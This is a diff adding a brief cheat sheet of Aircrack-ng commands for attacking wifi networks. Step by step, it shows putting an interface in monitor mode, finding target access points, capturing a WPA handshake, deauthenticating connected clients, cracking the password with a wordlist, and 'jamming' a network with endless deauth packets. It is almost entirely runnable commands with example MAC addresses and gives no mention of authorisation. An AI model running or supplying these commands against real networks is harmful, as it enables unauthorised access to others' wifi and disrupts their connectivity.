@@ -1,0 +1,29 @@
+1. Aircrack-ng Suite
+**Command-List
+
+Check Wireless Interface
+>> iwconfig
+
+Kill Interfering processes
+>>airmon-ng check kill
+
+Put your network device into monitor mode
+>> airmon-ng start wlan0
+
+Listen for all nearby beacon frames to get target BSSID and channel
+>> airodump-ng wlan0mon
+or >>wash -i wlan0
+
+Start listening for the handshake
+>> airodump-ng -c 10 --bssid 9C:5C:8E:C9:AB:C0 -w capture  mon0
+
+Optionally deauth a connected client to force a handshake
+>> aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0 (individual mac client)
+>>aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 (to all client who connected that wifi)
+
+Crack the password with aircrack-ng
+aircrack-ng -w rockyou.txt capture-01.cap
+
+Jam wifi with this command
+>> aireplay-ng -0 0 -a 9C:5C:8E:C9:AB:C0 wlan0mon  #use can use 5000 packets instead of 0
+>>aireplay-ng -0 0 -a 9C:5C:8E:C9:AB:C0 -c deviceMachere wlan0mon =for single device
